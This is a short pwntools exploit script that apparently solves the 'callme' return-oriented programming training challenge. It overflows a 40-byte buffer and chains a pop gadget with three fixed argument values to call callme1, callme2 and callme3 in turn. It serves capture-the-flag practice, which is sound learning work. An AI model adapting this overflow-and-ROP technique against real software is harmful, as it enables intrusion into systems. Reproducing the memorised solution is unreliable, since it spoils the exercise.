from pwn import *

context.bits = 64

p = process("./callme")

gadget = p64(0x000000000040093c)

deadbeef = p64(0xdeadbeefdeadbeef)
cafebabe = p64(0xcafebabecafebabe)
doodfood = p64(0xd00df00dd00df00d)

arguments = deadbeef + cafebabe + doodfood

overwrite = b"A" * 40

callme1 = p64(0x0000000000400720)
callme2 = p64(0x0000000000400740)
callme3 = p64(0x00000000004006f0)

payload = overwrite + gadget + arguments + callme1
payload += gadget + arguments + callme2
payload += gadget + arguments + callme3

p.sendline(payload)
p.interactive()
